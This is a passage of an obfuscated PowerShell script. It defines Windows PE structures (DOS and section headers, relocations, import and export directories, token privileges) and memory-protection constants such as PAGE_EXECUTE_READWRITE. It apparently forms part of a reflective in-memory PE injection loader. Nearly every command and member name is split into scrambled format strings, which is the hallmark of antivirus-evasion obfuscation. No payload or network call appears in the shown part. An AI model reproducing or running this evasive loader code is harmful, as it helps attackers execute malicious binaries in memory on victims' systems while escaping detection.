		${tyP`ebuIL`dEr} = ${mo`dU`L`ebuilder}.("{1}{0}{2}"-f 'ef','D','ineType').Invoke(("{1}{3}{4}{2}{0}"-f 'R','IM','S_HEADE','AGE_','DO'), ${atTRIBU`T`es}, [System.ValueType], 64)
		${T`yPe`BUi`LdER}.("{0}{1}{2}" -f 'Defin','eFiel','d').Invoke(("{0}{1}" -f'e_','magic'), [UInt16], ("{1}{0}" -f 'blic','Pu')) | &("{1}{2}{0}"-f 'll','Out-N','u')
		${T`YP`EB`UiLdEr}.("{3}{2}{0}{1}"-f'in','eField','f','De').Invoke(("{0}{1}" -f 'e_cbl','p'), [UInt16], ("{1}{0}" -f'lic','Pub')) | &("{1}{0}" -f'll','Out-Nu')
		${ty`PEbUil`DEr}.("{2}{0}{1}" -f'eF','ield','Defin').Invoke(("{1}{0}" -f'cp','e_'), [UInt16], ("{0}{1}{2}"-f'Pu','bli','c')) | &("{0}{2}{1}" -f'Ou','Null','t-')
		${t`YP`ebu`ILdEr}.("{2}{0}{1}{3}"-f'F','i','Define','eld').Invoke(("{0}{1}" -f 'e_crl','c'), [UInt16], ("{0}{1}"-f'P','ublic')) | &("{1}{0}{2}"-f 'l','Out-Nu','l')
		${tyP`Eb`UildEr}.("{2}{1}{3}{0}" -f 'eld','f','De','ineFi').Invoke(("{2}{1}{0}"-f'arhdr','_cp','e'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
		${TYPE`BuiL`D`Er}.("{0}{2}{1}" -f 'D','ield','efineF').Invoke(("{0}{2}{1}"-f'e','alloc','_min'), [UInt16], ("{0}{1}"-f 'Pub','lic')) | &("{1}{0}{2}" -f 'ul','Out-N','l')
		${typeB`UI`l`der}.("{1}{0}{2}"-f 'ie','DefineF','ld').Invoke(("{2}{0}{1}" -f 'maxal','loc','e_'), [UInt16], ("{1}{0}" -f'c','Publi')) | &("{2}{0}{1}" -f't-N','ull','Ou')
		${tyP`eBuiL`D`er}.("{1}{0}{2}{3}"-f 'Fie','Define','l','d').Invoke(("{1}{0}"-f 's','e_s'), [UInt16], ("{0}{1}" -f'P','ublic')) | &("{1}{2}{0}" -f 'l','Out-Nu','l')
		${t`YPE`BuiLDer}.("{3}{2}{0}{1}" -f 'eFi','eld','n','Defi').Invoke(("{1}{0}" -f 'sp','e_'), [UInt16], ("{0}{2}{1}" -f'P','lic','ub')) | &("{1}{0}"-f 't-Null','Ou')
		${T`y`pe`BuIlder}.("{0}{1}{2}" -f 'D','e','fineField').Invoke(("{1}{0}"-f '_csum','e'), [UInt16], ("{1}{0}"-f 'blic','Pu')) | &("{2}{1}{0}" -f'-Null','ut','O')
		${tYPeB`U`ILdeR}.("{1}{0}{2}" -f'efin','D','eField').Invoke(("{0}{1}"-f'e','_ip'), [UInt16], ("{0}{2}{1}"-f'P','c','ubli')) | &("{1}{0}" -f'l','Out-Nul')
		${Ty`PE`BUiLDER}.("{1}{0}{2}"-f'fi','De','neField').Invoke(("{0}{1}" -f 'e','_cs'), [UInt16], ("{2}{0}{1}"-f'li','c','Pub')) | &("{0}{1}{2}" -f 'Out-N','u','ll')
		${TYP`eb`UI`lDeR}.("{0}{1}{2}{3}"-f 'De','f','in','eField').Invoke(("{1}{2}{0}" -f'c','e_l','farl'), [UInt16], ("{1}{2}{0}" -f'c','Publ','i')) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		${t`yPebu`i`lDer}.("{1}{2}{3}{0}" -f 'eld','D','ef','ineFi').Invoke(("{0}{1}" -f 'e_o','vno'), [UInt16], ("{1}{2}{0}" -f 'c','P','ubli')) | &("{2}{1}{0}" -f'll','Nu','Out-')

		${E`_r`eSFieLD} = ${TYPE`B`U`ILDer}.("{1}{3}{2}{0}"-f'd','De','Fiel','fine').Invoke(("{1}{0}"-f's','e_re'), [UInt16[]], ("{1}{5}{3}{0}{4}{2}" -f 'a','Pub','l','M','rsha','lic, HasField'))
		${C`onS`Tru`CtorvALuE} =  ( &("{1}{0}{2}" -f'VaR','gEt-','iABle')  ("{0}{1}"-f'r','0y4') -VA)::"BYva`la`RRaY"
		${FIE`LDaR`R`AY} = @(  ${yZgk`O0}.("{2}{0}{1}"-f 'et','Field','G').Invoke(("{0}{1}"-f 'Size','Const')))
		${at`T`Rib`BUILd`eR} = &("{1}{2}{0}" -f'ct','Ne','w-Obje') ("{2}{0}{4}{7}{6}{9}{8}{3}{5}{1}" -f'stem.Ref','lder','Sy','bu','lec','teBui','it.Cu','tion.Em','i','stomAttr')(${ConsT`R`UCT`or`iNFO}, ${Co`NS`Truc`TorVALue}, ${fielD`A`RRAY}, @([Int32] 4))
		${E`_r`eSfI`eLd}.("{3}{2}{0}{4}{1}{5}"-f'omAttr','but','etCust','S','i','e').Invoke(${aTTR`i`B`BuilDEr})

		${typEBUI`l`Der}.("{2}{0}{1}{3}" -f 'e','Fiel','Defin','d').Invoke(("{0}{1}{2}" -f'e_','o','emid'), [UInt16], ("{0}{1}" -f 'Pu','blic')) | &("{1}{0}{2}"-f'u','Out-N','ll')
		${TYPebU`i`lDEr}.("{0}{2}{1}{3}" -f 'Defi','e','n','Field').Invoke(("{0}{1}{2}"-f'e_','o','eminfo'), [UInt16], ("{0}{1}"-f 'P','ublic')) | &("{2}{0}{1}" -f't-Nu','ll','Ou')

		${e_REs`2FI`eld} = ${ty`PEB`UILd`ER}.("{0}{1}{2}" -f 'Def','ineFiel','d').Invoke(("{1}{0}"-f 's2','e_re'), [UInt16[]], ("{5}{2}{0}{4}{3}{1}" -f 'sFieldM','shal','a','r','a','Public, H'))
		${C`OnsTRuct`o`RV`AluE} =  ( &("{0}{1}"-f 'G','cI')  ("VAriABl"+"E:r0"+"Y4") )."V`ALuE"::"byV`Al`AR`RaY"
		${a`T`TRibBUil`dER} = &("{0}{1}{2}"-f 'New-O','bjec','t') ("{0}{7}{9}{8}{2}{4}{1}{5}{3}{6}"-f 'Sy','CustomAttrib','ion','t','.Emit.','u','eBuilder','ste','Reflect','m.')(${C`Ons`TR`UCtorInfO}, ${cons`TRu`C`ToR`V`Alue}, ${fI`ELdA`RrAY}, @([Int32] 10))
		${e`_res2fIe`Ld}.("{2}{1}{3}{0}{4}" -f 'ibu','Custom','Set','Attr','te').Invoke(${aTtr`ibbUil`DEr})

		${ty`pEB`U`IlDeR}.("{1}{2}{3}{0}"-f'ield','D','ef','ineF').Invoke(("{2}{1}{0}"-f 'anew','lf','e_'), [Int32], ("{0}{1}" -f 'Pub','lic')) | &("{2}{0}{1}"-f 'N','ull','Out-')
		${I`MAGe_d`O`S_`hEaDER} = ${TYpe`BUI`lDEr}.("{1}{0}{2}"-f'yp','CreateT','e').Invoke()	
		${wIn3`2T`Y`PEs} | &("{1}{2}{0}"-f 'mber','A','dd-Me') -MemberType ("{1}{0}{3}{2}" -f'ot','N','y','ePropert') -Name ("{1}{4}{5}{0}{2}{3}"-f '_HEA','IMA','DE','R','GE_DO','S') -Value ${ImAgE_Dos_H`E`A`D`Er}

		
		${a`TtR`Ibut`ES} = ("{22}{4}{14}{5}{8}{6}{9}{19}{0}{12}{10}{3}{20}{11}{21}{15}{18}{13}{7}{2}{16}{1}{17}"-f 'lass, Pub','d','r','ent','u','ayout','An','efo',', ','siClass, ','qu','alLayou','lic, Se',', B','toL',' S','eFiel','Init','ealed','C','i','t,','A')
		${tY`Peb`UiL`DeR} = ${mod`U`LEBUilD`Er}.("{0}{2}{1}"-f 'De','Type','fine').Invoke(("{0}{1}{3}{4}{2}" -f 'IMAGE_SECT','ION_H','R','E','ADE'), ${aTT`RibU`T`Es}, [System.ValueType], 40)

		${n`AmEf`Ield} = ${T`Ype`BuIl`DER}.("{3}{0}{2}{1}" -f 'ineFie','d','l','Def').Invoke(("{1}{0}"-f'me','Na'), [Char[]], ("{0}{2}{4}{3}{1}{5}"-f'P','r','ub','Ma','lic, HasField','shal'))
		${CO`Ns`TrUctOr`VaLue} =   ${r0`Y4}::"bYv`AlaR`RAY"
		${A`TTr`Ib`BuiLder} = &("{2}{0}{1}" -f'Ob','ject','New-') ("{3}{7}{10}{11}{8}{2}{0}{4}{5}{6}{9}{1}"-f '.Em','ilder','tion','Sys','it.Cust','omAttribute','B','tem.','c','u','R','efle')(${COn`stRu`C`TOR`Info}, ${cONS`TrUCToR`V`Al`UE}, ${f`i`eldAr`RAY}, @([Int32] 8))
		${NAM`e`FIeld}.("{2}{0}{1}{3}{4}" -f 'ustom','Attri','SetC','but','e').Invoke(${aTT`RiBBuIlD`Er})

		${tYPEB`U`Il`DeR}.("{2}{1}{3}{0}"-f'ld','efineFi','D','e').Invoke(("{2}{0}{1}"-f'irtua','lSize','V'), [UInt32], ("{2}{1}{0}" -f'ic','ubl','P')) | &("{1}{0}{2}"-f't-Nul','Ou','l')
		${tY`pEbUi`Ld`ER}.("{2}{1}{0}" -f'd','iel','DefineF').Invoke(("{2}{3}{4}{1}{0}"-f 's','s','Vir','t','ualAddre'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{0}{2}{1}"-f 'O','Null','ut-')
		${ty`PE`BUiLD`eR}.("{2}{1}{0}" -f 'eld','neFi','Defi').Invoke(("{3}{1}{0}{2}"-f 't','zeOfRawDa','a','Si'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{1}{2}{0}"-f 't-Null','O','u')
		${tyP`eBU`ildeR}.("{1}{0}{2}" -f 'fin','De','eField').Invoke(("{1}{0}{2}{3}" -f 'er','Point','To','RawData'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{2}{0}" -f 'll','Out','-Nu')
		${T`Yp`ebuIlDEr}.("{0}{3}{1}{2}" -f'Def','F','ield','ine').Invoke(("{4}{3}{0}{5}{2}{1}" -f'rToRe','tions','oca','te','Poin','l'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{1}{2}{0}" -f 'll','Out-','Nu')
		${tyPE`B`U`ildER}.("{2}{3}{1}{0}"-f'eField','n','Def','i').Invoke(("{4}{5}{0}{1}{3}{6}{2}"-f 'L','i','mbers','ne','P','ointerTo','nu'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{0}{1}{2}" -f 'Out','-N','ull')
		${TYPEb`UiL`DEr}.("{0}{2}{1}" -f 'Defi','eField','n').Invoke(("{3}{2}{1}{4}{5}{0}{6}"-f'o','oca','erOfRel','Numb','t','i','ns'), [UInt16], ("{2}{1}{0}"-f'lic','ub','P')) | &("{0}{1}"-f'O','ut-Null')
		${typ`eB`UI`LdEr}.("{1}{3}{2}{0}" -f'd','D','iel','efineF').Invoke(("{0}{3}{2}{5}{4}{1}"-f 'Nu','ers','rOfLinen','mbe','b','um'), [UInt16], ("{0}{1}"-f 'Publi','c')) | &("{0}{1}" -f'Ou','t-Null')
		${Typ`E`Bu`IlDEr}.("{2}{0}{1}"-f'neFie','ld','Defi').Invoke(("{4}{2}{0}{1}{3}"-f'ac','teristic','har','s','C'), [UInt32], ("{1}{2}{0}"-f 'ic','P','ubl')) | &("{2}{1}{0}" -f'll','-Nu','Out')
		${i`Ma`gE`_SectiOn_`HE`ADeR} = ${tY`pe`BUILdEr}.("{0}{2}{1}"-f'Cre','ype','ateT').Invoke()
		${wI`N32TY`P`es} | &("{1}{0}{2}{3}"-f'd','Ad','-Memb','er') -MemberType ("{2}{1}{0}{3}"-f 'pe','ePro','Not','rty') -Name ("{3}{2}{4}{1}{0}"-f'DER','SECTION_HEA','MA','I','GE_') -Value ${iMaGe_Sec`Tion`_H`E`Ad`Er}

		
		${aTtr`iB`U`TES} = ("{15}{5}{10}{0}{2}{12}{11}{16}{3}{13}{14}{6}{8}{1}{9}{7}{4}"-f'iClass,','S',' Cl','c,','ldInit','ayou','Lay','led, BeforeFie','out, ','ea','t, Ans','l','ass, Pub',' Sequenti','al','AutoL','i')
		${tY`PE`BU`IlDER} = ${MODU`l`E`BUIldEr}.("{2}{1}{0}"-f'ype','efineT','D').Invoke(("{3}{2}{1}{0}"-f 'N','RELOCATIO','E_BASE_','IMAG'), ${A`T`TRIBUTes}, [System.ValueType], 8)
		${Typ`Eb`UIlder}.("{1}{0}{2}{3}" -f 'fin','De','eFiel','d').Invoke(("{2}{0}{3}{1}" -f 'rtual','dress','Vi','Ad'), [UInt32], ("{0}{2}{1}"-f 'Publ','c','i')) | &("{0}{1}" -f 'Out-','Null')
		${TYP`EbuiLd`eR}.("{0}{1}{2}"-f 'De','fineFiel','d').Invoke(("{0}{2}{1}" -f 'Si','OfBlock','ze'), [UInt32], ("{1}{0}"-f 'blic','Pu')) | &("{1}{0}"-f'ull','Out-N')
		${iMAgE`_bAs`e_r`elO`cati`ON} = ${tyP`Ebui`LD`ER}.("{2}{1}{0}{3}"-f 'Ty','reate','C','pe').Invoke()
		${WI`N32`T`Ypes} | &("{0}{2}{3}{1}" -f 'Add','ber','-','Mem') -MemberType ("{2}{1}{3}{0}"-f'y','er','NoteProp','t') -Name ("{1}{4}{0}{5}{2}{3}"-f'RELOCA','I','IO','N','MAGE_BASE_','T') -Value ${iM`AgE_b`A`Se_rEL`o`Ca`TION}

		
		${atTr`i`BuTES} = ("{6}{8}{5}{1}{2}{12}{10}{7}{4}{0}{11}{3}{9}"-f', Sea',', Class',',',' BeforeFiel','Layout','s','A','Sequential','utoLayout, AnsiClas','dInit','c, ','led,',' Publi')
		${Typeb`UI`lDeR} = ${Modu`le`Bui`lD`ER}.("{2}{1}{0}" -f'ineType','f','De').Invoke(("{6}{2}{0}{5}{4}{3}{1}"-f 'PORT','PTOR','_IM','RI','ESC','_D','IMAGE'), ${AT`Tr`ibU`TES}, [System.ValueType], 20)
		${t`Yp`EbUiLdEr}.("{3}{0}{2}{1}"-f 'fi','eld','neFi','De').Invoke(("{1}{2}{3}{4}{0}" -f'cs','Ch','ar','acteris','ti'), [UInt32], ("{0}{1}" -f'Publ','ic')) | &("{1}{0}{2}" -f 'ut-Nul','O','l')
		${tY`P`E`BuIlDER}.("{2}{0}{1}{3}" -f'i','ne','Def','Field').Invoke(("{1}{0}{2}{3}"-f 'imeDateSt','T','a','mp'), [UInt32], ("{0}{1}{2}" -f'P','u','blic')) | &("{0}{1}" -f 'Out-','Null')
		${tyP`eb`UiLDer}.("{2}{0}{3}{1}"-f 'efineFi','ld','D','e').Invoke(("{2}{0}{3}{1}" -f'rwarderC','in','Fo','ha'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{2}{0}{1}" -f'ul','l','Out-N')
		${tYpebuI`ld`Er}.("{2}{1}{3}{0}"-f 'd','f','De','ineFiel').Invoke(("{0}{1}"-f'N','ame'), [UInt32], ("{1}{0}" -f'c','Publi')) | &("{0}{2}{1}"-f'Out-N','l','ul')
		${tYP`ebuI`LdEr}.("{1}{2}{0}" -f'ld','D','efineFie').Invoke(("{1}{0}{2}" -f'rstThun','Fi','k'), [UInt32], ("{1}{0}" -f 'blic','Pu')) | &("{0}{1}"-f 'Out-','Null')
		${i`mA`Ge`_imPoR`T_dESCrip`T`oR} = ${Ty`p`EBuI`lDER}.("{1}{0}{2}{3}" -f 'e','Cr','at','eType').Invoke()
		${wI`N32`TYPeS} | &("{1}{0}{2}"-f 'd-Mem','Ad','ber') -MemberType ("{3}{2}{1}{0}" -f'perty','Pro','ote','N') -Name ("{0}{1}{3}{2}{4}"-f 'IMAGE_IMPORT_D','ESC','IPTO','R','R') -Value ${iMa`GE`_`ImPo`R`T_de`sCrIpTOR}

		
		${AT`TR`ibUTES} = ("{2}{4}{7}{12}{3}{9}{13}{5}{10}{21}{18}{20}{8}{19}{14}{1}{15}{0}{16}{11}{17}{6}" -f 'd, Be','e','AutoLa','C','y',' Class, Publ','nit','out, Ans','y','las','ic','eld','i','s,','ut, S','ale','foreFi','I','a','o','lLa',', Sequenti')
		${Ty`p`eBuild`ER} = ${mOD`ULEBUiLd`ER}.("{1}{0}{2}"-f 'f','De','ineType').Invoke(("{4}{1}{2}{0}{5}{3}"-f'_E','A','GE','DIRECTORY','IM','XPORT_'), ${AT`T`RIbUT`ES}, [System.ValueType], 40)
		${t`Yp`e`BuiLdER}.("{1}{0}{2}" -f 'Fiel','Define','d').Invoke(("{0}{2}{1}{3}" -f'Chara','ter','c','istics'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{2}{0}{1}" -f 'ut','-Null','O')
		${typeBUI`l`Der}.("{1}{2}{0}{3}"-f 'ne','D','efi','Field').Invoke(("{3}{2}{0}{1}" -f'eSta','mp','at','TimeD'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{1}{0}"-f 'ut-Null','O')
		${T`ypEbUiLD`Er}.("{2}{1}{0}"-f'ld','eFie','Defin').Invoke(("{1}{0}{2}{3}"-f'Vers','Major','i','on'), [UInt16], ("{2}{0}{1}" -f'li','c','Pub')) | &("{0}{2}{1}" -f 'O','-Null','ut')
		${tYpeB`UIld`ER}.("{0}{2}{1}" -f 'DefineF','d','iel').Invoke(("{0}{1}{3}{2}" -f 'Mi','no','on','rVersi'), [UInt16], ("{2}{1}{0}" -f'c','bli','Pu')) | &("{0}{2}{1}"-f'O','l','ut-Nul')
		${TYPE`B`UIl`dER}.("{0}{3}{1}{2}"-f 'D','fineFie','ld','e').Invoke(("{0}{1}"-f 'Nam','e'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{1}{2}{0}" -f'-Null','O','ut')
		${t`Yp`ebUiLDer}.("{3}{2}{0}{1}"-f'F','ield','fine','De').Invoke(("{1}{0}"-f 'se','Ba'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}{2}" -f 'ut-Nul','O','l')
		${T`yPEbuI`Lder}.("{3}{0}{1}{2}"-f 'n','eF','ield','Defi').Invoke(("{2}{0}{3}{1}"-f'OfF','ctions','Number','un'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{0}{1}{2}"-f 'Out','-Nul','l')
		${type`B`UiLD`Er}.("{0}{2}{1}"-f'De','eld','fineFi').Invoke(("{1}{0}{3}{2}" -f 'um','N','Names','berOf'), [UInt32], ("{2}{1}{0}" -f 'c','bli','Pu')) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		${Ty`p`EBuiL`dEr}.("{1}{0}{2}" -f 'efin','D','eField').Invoke(("{4}{3}{5}{0}{1}{2}" -f 'i','o','ns','essOfFu','Addr','nct'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{1}{0}{2}" -f'-N','Out','ull')
		${TYPE`BuiL`DeR}.("{3}{1}{2}{0}"-f'ld','efineF','ie','D').Invoke(("{1}{0}{2}{3}" -f'dr','Ad','essOfNa','mes'), [UInt32], ("{1}{0}{2}" -f'ub','P','lic')) | &("{1}{0}{2}" -f'Nul','Out-','l')
		${t`y`peBuiLdER}.("{0}{2}{3}{1}" -f 'D','ld','efineF','ie').Invoke(("{1}{4}{0}{2}{3}"-f'O','Add','fNameOrd','inals','ress'), [UInt32], ("{2}{1}{0}"-f 'lic','b','Pu')) | &("{0}{2}{1}" -f'Out-N','ll','u')
		${I`mAg`e_E`XP`oRt_d`ire`CToRY} = ${TYp`EBUiL`D`ER}.("{0}{1}{2}"-f 'Creat','eT','ype').Invoke()
		${w`iN3`2t`Ypes} | &("{1}{2}{0}"-f 'mber','Add','-Me') -MemberType ("{1}{0}{2}{3}" -f 'otePr','N','ope','rty') -Name ("{2}{3}{1}{4}{0}"-f'Y','RT','IMA','GE_EXPO','_DIRECTOR') -Value ${iMAG`e_`EXport`_dir`eC`TORy}
		
		
		${aT`T`Ri`BUtes} = ("{9}{10}{13}{15}{0}{19}{21}{8}{1}{2}{12}{6}{4}{17}{5}{7}{20}{11}{3}{14}{16}{18}"-f'ns','s, Cl','ass','d, B','tia','ay','uen','out, Sea','s','A','u','e',', Public, Seq','to','eforeF','Layout, A','ield','lL','Init','i','l','Cla')
		${TyP`E`BUiL`deR} = ${mOD`ULEb`U`ILdeR}.("{1}{0}{2}"-f 'Ty','Define','pe').Invoke(("{1}{0}"-f 'ID','LU'), ${atT`R`ib`UTes}, [System.ValueType], 8)
		${TYP`eBU`IldeR}.("{1}{2}{0}"-f'eField','D','efin').Invoke(("{1}{0}{2}" -f'ow','L','Part'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
		${tY`pe`Bu`iLDer}.("{1}{2}{0}"-f'eld','Def','ineFi').Invoke(("{1}{0}{2}"-f 'ig','H','hPart'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{0}{1}" -f'Out','-Null')
		${lU`id} = ${Type`B`U`ILder}.("{0}{1}{2}"-f'Cr','ea','teType').Invoke()
		${wIN32`T`yPES} | &("{0}{3}{2}{1}" -f 'Ad','Member','-','d') -MemberType ("{0}{3}{2}{1}" -f'No','ty','er','teProp') -Name ("{0}{1}" -f 'L','UID') -Value ${l`UiD}
		
		
		${At`TR`IbuTes} = ("{3}{6}{8}{11}{15}{2}{4}{17}{16}{0}{10}{20}{13}{5}{19}{1}{18}{12}{14}{7}{21}{9}" -f'Layo',', Before','lic, ','A','Se','al','utoLayo','dI','ut, AnsiClass, Cl','it','u','ass, Pu','ie','Se','l','b','ential','qu','F','ed','t, ','n')
		${TYp`EB`Ui`ldER} = ${M`ODULeB`UildEr}.("{1}{0}{2}" -f'fineTy','De','pe').Invoke(("{0}{4}{3}{1}{2}{5}" -f 'LUI','A','ND_ATTRIBUT','_','D','ES'), ${ATtri`BUt`es}, [System.ValueType], 12)
		${Typ`EBuIL`dER}.("{3}{0}{2}{1}" -f'fi','ield','neF','De').Invoke(("{0}{1}" -f 'Lu','id'), ${lU`id}, ("{0}{1}{2}"-f'Pub','li','c')) | &("{0}{2}{1}" -f 'O','l','ut-Nul')
		${t`Y`PeBuild`ER}.("{3}{0}{2}{1}"-f'fine','ld','Fie','De').Invoke(("{2}{1}{0}"-f'ibutes','ttr','A'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{1}{2}{0}" -f 'ull','Ou','t-N')
		${luI`D_And`_aTTRiB`Utes} = ${t`Y`P`EBuIlDEr}.("{1}{2}{0}"-f'ype','Cre','ateT').Invoke()
		${wiN32t`Yp`es} | &("{1}{3}{2}{0}"-f'ember','Ad','M','d-') -MemberType ("{0}{2}{1}"-f 'Note','rty','Prope') -Name ("{2}{3}{1}{0}"-f'UTES','IB','LUID_AND_AT','TR') -Value ${LUID_a`N`D_at`TrIb`UTES}
		
		
		${a`T`TRi`BuTES} = ("{16}{10}{11}{8}{4}{1}{18}{19}{0}{14}{9}{15}{17}{12}{5}{7}{3}{21}{6}{13}{20}{2}"-f's, Cl','Cl','it','al','t, Ansi','que','yout, Sealed, BeforeF','nti','ayou','s, ','u','toL','ic, Se','ieldI','as','Pub','A','l','a','s','n','La')
		${TYpeB`UiL`dER} = ${mOD`U`leBUiL`dER}.("{3}{0}{1}{2}"-f 'fine','T','ype','De').Invoke(("{0}{2}{1}{3}"-f'T','IL','OKEN_PRIV','EGES'), ${ATtRi`BU`T`es}, [System.ValueType], 16)
		${tYp`E`BuiLD`ER}.("{2}{1}{0}" -f 'd','efineFiel','D').Invoke(("{3}{1}{2}{0}"-f't','vilegeC','oun','Pri'), [UInt32], ("{1}{2}{0}" -f 'ic','P','ubl')) | &("{0}{1}{2}"-f'O','u','t-Null')
		${Ty`Pe`BUi`lDEr}.("{0}{1}{3}{2}" -f'D','efin','eld','eFi').Invoke(("{0}{2}{3}{1}"-f 'Pr','s','ivile','ge'), ${LUID`_AND_at`TRi`B`UteS}, ("{1}{2}{0}" -f 'c','Pu','bli')) | &("{0}{1}"-f 'O','ut-Null')
		${tOk`eN_PR`I`VI`lEgES} = ${tYPebu`il`D`Er}.("{1}{2}{0}" -f'pe','Create','Ty').Invoke()
		${Win`3`2TyPeS} | &("{0}{1}{2}"-f 'Ad','d-Mem','ber') -MemberType ("{2}{3}{0}{1}"-f 'Propert','y','N','ote') -Name ("{2}{3}{1}{0}" -f 'EGES','N_PRIVIL','T','OKE') -Value ${t`okEN_p`RiV`iLEg`Es}

		return ${w`iN`32typES}
	}

	Function gE`T-`wiN32CoN`s`Ta`NTs
	{
		${Wi`N3`2COnStANtS} = &("{0}{2}{1}"-f'New-Obj','ct','e') ("{2}{0}{1}"-f 'O','bject','System.')
		
		${w`in`32`cOns`TANts} | &("{1}{2}{0}"-f 'ber','Add-','Mem') -MemberType ("{1}{2}{0}" -f'ty','N','oteProper') -Name ("{2}{0}{1}" -f 'EM_COMMI','T','M') -Value 0x00001000
		${WIn`32C`ONs`Tan`Ts} | &("{2}{0}{1}" -f 'dd-Membe','r','A') -MemberType ("{2}{1}{0}{3}" -f 'rop','oteP','N','erty') -Name ("{1}{2}{0}{3}" -f 'R','M','EM_','ESERVE') -Value 0x00002000
		${w`In32C`O`Nstan`TS} | &("{0}{3}{1}{2}" -f'A','emb','er','dd-M') -MemberType ("{0}{1}{2}" -f 'N','otePro','perty') -Name ("{0}{3}{2}{1}"-f 'P','ESS','GE_NOACC','A') -Value 0x01
		${wI`N32co`Nst`AnTs} | &("{1}{0}{2}" -f'dd-M','A','ember') -MemberType ("{2}{1}{0}{3}" -f 'e','teProp','No','rty') -Name ("{4}{0}{1}{2}{3}" -f'E_','REA','DO','NLY','PAG') -Value 0x02
		${WIn3`2cons`T`AN`Ts} | &("{2}{0}{1}{3}" -f '-Me','mb','Add','er') -MemberType ("{1}{3}{2}{0}" -f 'ty','NoteP','r','rope') -Name ("{4}{0}{1}{3}{2}"-f'GE_RE','ADWRI','E','T','PA') -Value 0x04
		${wIn`32`cON`ST`ANTs} | &("{0}{1}{2}"-f 'Ad','d-Memb','er') -MemberType ("{1}{2}{0}"-f'ty','NotePrope','r') -Name ("{3}{2}{1}{4}{0}"-f 'Y','O','ITEC','PAGE_WR','P') -Value 0x08
		${W`in32Co`Nst`Ants} | &("{1}{2}{0}"-f'ber','Add-','Mem') -MemberType ("{1}{2}{3}{0}"-f'y','Not','eP','ropert') -Name ("{3}{1}{0}{2}" -f'EX','GE_','ECUTE','PA') -Value 0x10
		${WiN3`2co`Ns`TANTS} | &("{1}{0}{2}" -f '-Mem','Add','ber') -MemberType ("{1}{2}{0}{3}" -f'p','NotePr','o','erty') -Name ("{2}{0}{3}{1}" -f 'C','D','PAGE_EXE','UTE_REA') -Value 0x20
		${W`IN32CoN`sTaNts} | &("{1}{0}{2}" -f'dd-Me','A','mber') -MemberType ("{3}{0}{2}{1}" -f'ope','y','rt','NotePr') -Name ("{0}{3}{2}{5}{1}{4}" -f 'PAG','W','XECUTE_REA','E_E','RITE','D') -Value 0x40
		${W`i`N32cOn`STAntS} | &("{2}{1}{0}" -f'ember','-M','Add') -MemberType ("{1}{3}{2}{0}"-f'rty','NoteP','pe','ro') -Name ("{5}{6}{3}{4}{0}{1}{2}" -f'EC','OP','Y','EXECUTE','_WRIT','PAG','E_') -Value 0x80
		${wiN3`2cOn`st`A`Nts} | &("{2}{1}{0}"-f'ember','d-M','Ad') -MemberType ("{2}{0}{1}"-f 'tePropert','y','No') -Name ("{1}{2}{0}"-f 'HE','PAGE_NOCA','C') -Value 0x200
		${WIN`3`2coNst`AN`TS} | &("{2}{0}{1}"-f'Memb','er','Add-') -MemberType ("{2}{0}{3}{1}" -f 'Pr','y','Note','opert') -Name ("{0}{2}{3}{5}{1}{4}"-f 'IMAGE_RE','T','L','_B','E','ASED_ABSOLU') -Value 0
		${WiN32c`oN`STa`NtS} | &("{0}{1}{2}" -f'Add','-Memb','er') -MemberType ("{1}{2}{0}{3}" -f'Pr','N','ote','operty') -Name ("{3}{1}{5}{4}{0}{2}" -f 'ED_HIGH','E_RE','LOW','IMAG','S','L_BA') -Value 3
		${wi`N32`cons`T`AnTS} | &("{0}{2}{3}{1}" -f'A','ber','d','d-Mem') -MemberType ("{0}{2}{1}" -f'Not','perty','ePro') -Name ("{4}{3}{1}{0}{2}" -f'A','_B','SED_DIR64','MAGE_REL','I') -Value 10
		${win32`c`ONsTa`N`Ts} | &("{2}{0}{1}"-f 'b','er','Add-Mem') -MemberType ("{0}{1}{3}{2}"-f 'NotePr','oper','y','t') -Name ("{0}{4}{3}{1}{2}" -f'IMAG','ARDABL','E','MEM_DISC','E_SCN_') -Value 0x02000000
		${W`i`N`32`CONstantS} | &("{3}{0}{2}{1}"-f'-','mber','Me','Add') -MemberType ("{2}{3}{0}{1}" -f'roper','ty','Not','eP') -Name ("{1}{3}{2}{0}" -f'TE','IMA','EM_EXECU','GE_SCN_M') -Value 0x20000000
		${wIn3`2c`ON`St`ANts} | &("{2}{1}{0}"-f'er','-Memb','Add') -MemberType ("{2}{0}{1}" -f 'Prope','rty','Note') -Name ("{3}{0}{4}{1}{2}" -f'SCN_MEM_','EA','D','IMAGE_','R') -Value 0x40000000
		${WI`N32`con`S`TAnTS} | &("{1}{0}{2}"-f 'd-Memb','Ad','er') -MemberType ("{1}{0}{3}{2}" -f 'teProp','No','rty','e') -Name ("{4}{3}{0}{1}{6}{5}{2}" -f'_S','CN','ITE','E','IMAG','WR','_MEM_') -Value 0x80000000
		${WIn`32ConS`TAnTS} | &("{2}{1}{0}" -f'r','-Membe','Add') -MemberType ("{0}{1}{2}{3}"-f'NotePr','o','pe','rty') -Name ("{4}{0}{3}{6}{5}{1}{2}"-f'G','CHE','D','E_SCN_','IMA','A','MEM_NOT_C') -Value 0x04000000
		${wIn32c`ons`T`A`NTS} | &("{2}{0}{1}"-f 'dd-Memb','er','A') -MemberType ("{2}{3}{1}{0}"-f 'ty','teProper','N','o') -Name ("{3}{0}{2}{1}" -f '_D','OMMIT','EC','MEM') -Value 0x4000
